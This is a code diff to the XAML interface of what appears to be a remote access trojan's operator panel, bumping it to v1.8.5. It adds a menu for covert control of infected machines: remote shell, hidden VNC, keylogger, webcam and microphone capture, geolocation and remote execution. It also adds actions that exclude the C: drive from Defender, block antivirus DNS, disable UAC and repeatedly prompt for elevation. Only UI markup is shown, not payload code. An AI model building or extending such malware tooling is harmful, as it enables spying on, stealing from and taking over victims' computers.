@@ -2459,10 +2459,72 @@
                                 </DataGrid.Columns>
                                 <DataGrid.ContextMenu>
                                     <ContextMenu>
-                                        <MenuItem x:Name="RecMenuSetTag" Header="Set Tag"    Click="SetTagRecord_Click"><MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Label.svg'}" Width="14" Height="14"/></MenuItem.Icon></MenuItem>
-                                        <MenuItem x:Name="RecMenuViewLogs" Header="View Logs"  Click="ViewRecordLogs_Click"><MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Business Objects/BO_Report.svg'}" Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                        <MenuItem x:Name="RecMenuSetTag"   Header="Set Tag"   Click="SetTagRecord_Click">  <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Label.svg'}"  Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                        <MenuItem x:Name="RecMenuViewLogs" Header="View Logs" Click="ViewRecordLogs_Click"><MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Business Objects/BO_Report.svg'}"  Width="14" Height="14"/></MenuItem.Icon></MenuItem>
                                         <Separator />
-                                        <MenuItem x:Name="RecMenuCopyHwid" Header="Copy HWID"  Click="CopyRecordHwid_Click"><MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Copy.svg'}" Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                        <MenuItem x:Name="RecMenuCopyHwid" Header="Copy HWID" Click="CopyRecordHwid_Click"><MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Copy.svg'}"  Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                        <Separator/>
+                                        <!-- Administration -->
+                                        <MenuItem x:Name="AllMenuGrpAdmin" Header="Administration">
+                                            <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Security_Key.svg'}" Width="14" Height="14"/></MenuItem.Icon>
+                                            <MenuItem x:Name="AllMenuShell"        Header="Remote Shell"       Click="RemoteShell_Click">    <MenuItem.Icon><Image Source="pack://application:,,,/shell.png" Width="14" Height="14" RenderOptions.BitmapScalingMode="HighQuality"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuFileMgr"      Header="File Manager"       Click="FileManager_Click">    <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_FolderOpen.svg'}"          Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuProcMgr"      Header="Process Manager"    Click="ProcessManager_Click"> <MenuItem.Icon><Image Source="pack://application:,,,/processmanager.png" Width="14" Height="14" RenderOptions.BitmapScalingMode="HighQuality"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuStartupMgr"   Header="Startup Manager"    Click="StartupManager_Click"> <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Clock.svg'}"              Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuTcp"          Header="TCP Connections"    Click="TcpManager_Click">     <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Electronics_Router.svg'}"          Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuSvcMgr"       Header="Service Manager"    Click="ServiceManager_Click"> <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Settings.svg'}"            Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuWinMgr"       Header="Window Manager"     Click="WindowManager_Click">  <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Window.svg'}"              Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuRegistry"     Header="Registry Editor"    Click="RegistryEditor_Click"> <MenuItem.Icon><Image Source="pack://application:,,,/registry.png" Width="14" Height="14" RenderOptions.BitmapScalingMode="HighQuality"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuInstalledApps" Header="Installed Programs" Click="InstalledApps_Click"> <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Shopping_Box.svg'}"               Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuDevMgr"       Header="Device Manager"     Click="DeviceManager_Click">  <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Electronics_Mouse.svg'}"           Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuSocks5"       Header="SOCKS5 Proxy"       Click="Socks5_Click">         <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Business_World.svg'}"              Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <Separator/>
+                                            <MenuItem x:Name="AllMenuRemoteExec"   Header="Remote Execute"     Click="RemoteFileExec_Click"> <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Send.svg'}"               Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                        </MenuItem>
+                                        <!-- Monitoring -->
+                                        <MenuItem x:Name="AllMenuGrpMonitor" Header="Monitoring">
+                                            <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Security_Visibility.svg'}" Width="14" Height="14"/></MenuItem.Icon>
+                                            <MenuItem x:Name="AllMenuRdp"          Header="Remote Desktop"      Click="RemoteDesktop_Click">      <MenuItem.Icon><Image Source="pack://application:,,,/rdp.png" Width="14" Height="14" RenderOptions.BitmapScalingMode="HighQuality"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuWebcam"       Header="Webcam"              Click="RemoteWebcam_Click">        <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Electronics_Video.svg'}"      Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuHvnc"         Header="HVNC"                Click="Hvnc_Click">                <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Security_VisibilityOff.svg'}" Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuMic"          Header="Microphone"          Click="Microphone_Click">          <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Electronics_Microphone.svg'}" Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuSpeaker"      Header="Speaker"             Click="Speaker_Click">             <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Electronics_Headphone.svg'}"  Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuSpeakToClient" Header="Speak to Client"    Click="SpeakToClient_Click">       <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Electronics_Volume.svg'}"      Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuKeylogger"    Header="Keylogger"           Click="Keylogger_Click">           <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Electronics_Keyboard.svg'}"    Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <Separator/>
+                                            <MenuItem x:Name="AllMenuGeo"          Header="Geolocation"         Click="Geolocation_Click">         <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Travel_MapPointer.svg'}"       Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <Separator/>
+                                            <MenuItem x:Name="AllMenuPerf"         Header="Performance Monitor" Click="PerformanceMonitor_Click">  <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Business_LinearChart.svg'}"     Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                        </MenuItem>
+                                        <!-- Miscellaneous -->
+                                        <MenuItem x:Name="AllMenuGrpMisc" Header="Miscellaneous">
+                                            <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Options.svg'}" Width="14" Height="14"/></MenuItem.Icon>
+                                            <MenuItem x:Name="AllMenuExcludeDefender" Header="Exclude C:\ (Defender)" Click="QuickExcludeCDrive_Click"><MenuItem.Icon><Image Source="pack://application:,,,/defender.png" Width="14" Height="14" RenderOptions.BitmapScalingMode="HighQuality"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuBlockAvDns"      Header="Block AV DNS"            Click="QuickBlockAvDns_Click">  <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Forbid.svg'}"   Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuBlockWSReset"    Header="Block WSReset"           Click="QuickBlockReset_Click">  <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Rollback.svg'}" Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuDisableUac"      Header="Disable UAC"             Click="QuickDisableUac_Click">  <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Security_Unlock.svg'}"  Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <Separator/>
+                                            <MenuItem x:Name="AllMenuBotKiller"       Header="Run BotKiller"           Click="BotKiller_Click">        <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Business Objects/BO_Skull.svg'}"     Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                        </MenuItem>
+                                        <!-- Fun -->
+                                        <MenuItem x:Name="AllMenuGrpFun" Header="Fun">
+                                            <MenuItem.Icon><dx:DXImage Source="pack://application:,,,/Resources/Icons/laughing.svg" Width="14" Height="14"/></MenuItem.Icon>
+                                            <MenuItem x:Name="AllMenuFunPanel"  Header="Fun Panel"  Click="Fun_Click">   <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Shopping_Gift.svg'}" Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <Separator/>
+                                            <MenuItem x:Name="AllMenuTikTok"    Header="TikTok Bot" Click="TikTok_Click"><MenuItem.Icon><Image Source="pack://application:,,,/tiktok.png" Width="14" Height="14" RenderOptions.BitmapScalingMode="HighQuality"/></MenuItem.Icon></MenuItem>
+                                        </MenuItem>
+                                        <!-- Client Management -->
+                                        <MenuItem x:Name="AllMenuGrpClientMgmt" Header="Client Management">
+                                            <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Business Objects/BO_Customer.svg'}" Width="14" Height="14"/></MenuItem.Icon>
+                                            <MenuItem x:Name="AllMenuUacElevation"  Header="UAC Elevation"    Click="RequestElevation_Click">     <MenuItem.Icon><Viewbox Width="13" Height="14"><Canvas Width="20" Height="22"><Canvas.Clip><PathGeometry Figures="M10,0 L20,3 L20,12 C20,18 10,22 10,22 C10,22 0,18 0,12 L0,3 Z"/></Canvas.Clip><Rectangle Canvas.Left="0" Canvas.Top="0" Width="10" Height="11" Fill="#1769C4"/><Rectangle Canvas.Left="10" Canvas.Top="0" Width="10" Height="11" Fill="#EDAA00"/><Rectangle Canvas.Left="0" Canvas.Top="11" Width="10" Height="11" Fill="#EDAA00"/><Rectangle Canvas.Left="10" Canvas.Top="11" Width="10" Height="11" Fill="#1769C4"/><Path Data="M10,0 L20,3 L20,12 C20,18 10,22 10,22 C10,22 0,18 0,12 L0,3 Z" Stroke="#0A0B18" StrokeThickness="2.5" Fill="Transparent"/><Line X1="10" Y1="0" X2="10" Y2="22" Stroke="#0A0B18" StrokeThickness="1.2"/><Line X1="0" Y1="11" X2="20" Y2="11" Stroke="#0A0B18" StrokeThickness="1.2"/></Canvas></Viewbox></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuLoopUac"       Header="Loop UAC"         Click="RequestElevationLoop_Click"><MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Security_WarningCircled1.svg'}" Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <Separator/>
+                                            <MenuItem x:Name="AllMenuUpdate"        Header="Update Client"    Click="UpdateClient_Click">         <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Refresh.svg'}"           Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuDisconnect"    Header="Disconnect"       Click="DisconnectClient_Click">     <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Remove.svg'}"            Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem x:Name="AllMenuUninstall"     Header="Uninstall Client" Click="UninstallClient_Click">      <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Trash.svg'}"             Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                            <Separator/>
+                                            <MenuItem x:Name="AllMenuCopyIP"        Header="Copy IP"          Click="CopyIP_Click">               <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Copy.svg'}"             Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                        </MenuItem>
                                     </ContextMenu>
                                 </DataGrid.ContextMenu>
                             </DataGrid>
@@ -2843,10 +2905,7 @@
                                         <WrapPanel Orientation="Horizontal" Margin="0,0,0,2">
                                             <Button x:Name="BtnBuild" Width="110" Height="28"
                                                     Style="{StaticResource SGreenBtn}" Click="Build_Click" Margin="0,0,6,4">
-                                                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
-                                                    <dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Business Objects/BO_Project.svg'}" Width="13" Height="13" Margin="0,0,5,0" VerticalAlignment="Center"/>
-                                                    <TextBlock x:Name="TxtBtnBuild" Text="BUILD" VerticalAlignment="Center"/>
-                                                </StackPanel>
+                                                <TextBlock x:Name="TxtBtnBuild" Text="BUILD" VerticalAlignment="Center"/>
                                             </Button>
                                             <Button x:Name="BtnBldSave"     Content="SAVE"      MinWidth="64"  Padding="10,0" Height="28" Margin="0,0,6,4" Style="{StaticResource SBtn}" Click="BldSaveConfig_Click" />
                                             <Button x:Name="BtnBldCheckAll" Content="CHECK ALL" MinWidth="88"  Padding="10,0" Height="28" Margin="0,0,6,4" Style="{StaticResource SBtn}" Click="BldCheckAll_Click" />
@@ -4557,7 +4616,7 @@
                                                     BorderBrush="{DynamicResource AccentBrush}"
                                                     BorderThickness="1" CornerRadius="4" Padding="8,3"
                                                     HorizontalAlignment="Left">
-                                                <TextBlock Text="v1.8.4" Foreground="{DynamicResource AccentBrush}"
+                                                <TextBlock Text="v1.8.5" Foreground="{DynamicResource AccentBrush}"
                                                            FontSize="10" FontFamily="Consolas" FontWeight="SemiBold"/>
                                             </Border>
                                         </StackPanel>
